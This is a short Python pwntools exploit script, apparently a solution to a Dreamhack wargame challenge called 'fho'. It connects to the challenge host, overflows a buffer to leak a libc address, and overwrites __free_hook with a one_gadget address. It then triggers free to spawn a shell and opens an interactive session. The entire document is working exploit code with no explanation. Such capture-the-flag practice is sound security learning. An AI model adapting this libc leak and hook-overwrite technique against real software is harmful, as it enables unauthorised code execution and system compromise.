from pwn import *
context.arch ='amd64'
context.log_level ='debug'
p=remote('host3.dreamhack.games',2334)
e=ELF('./fho')
libc=ELF('./libc-2.27.so')

#hook overwrite
payload=b'A'*0x48 # overwrite buf and canary
p.sendafter(b'Buf: ',payload)
p.recvuntil(payload)

libc_start_main_231 = u64(p.recvline()[:-1] + b'\x00'*2) # return address
#libc_base
libc_base = libc_start_main_231 - (libc.symbols['__libc_start_main']+231) 
#system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
#one_gadget
og = libc_base + 0x4f432
#binsh = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(og).encode())

p.recvuntil('To free: ')
p.sendline(str(0x31337).encode())

p.interactive()

